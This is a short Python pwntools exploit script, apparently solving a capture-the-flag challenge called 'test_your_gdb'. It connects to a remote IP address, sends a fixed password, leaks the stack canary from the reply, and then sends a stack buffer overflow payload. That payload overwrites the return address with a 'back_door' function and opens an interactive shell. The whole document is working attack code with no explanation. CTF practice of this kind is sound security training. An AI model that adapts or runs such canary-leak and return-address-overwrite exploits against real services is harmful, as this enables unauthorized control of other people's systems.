from pwn import *
context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])


# io=process("./test_your_gdb")
io=remote("1.14.71.254",28043)
back_door=0x401256

io.recvuntil("word\n")

# gdb.attach(io)
# pause()

payload=p64(0xb0361e0e8294f147)+p64(0x8c09e0c34ed8a6a9)
io.send(payload)
io.recv(0x19)
canary=u64(io.recv(7).rjust(8,b"\x00"))
print("canary:  "+hex(canary))

payload=cyclic(0x18)+p64(canary)+p64(0)+p64(back_door)
io.sendline(payload)

io.interactive()
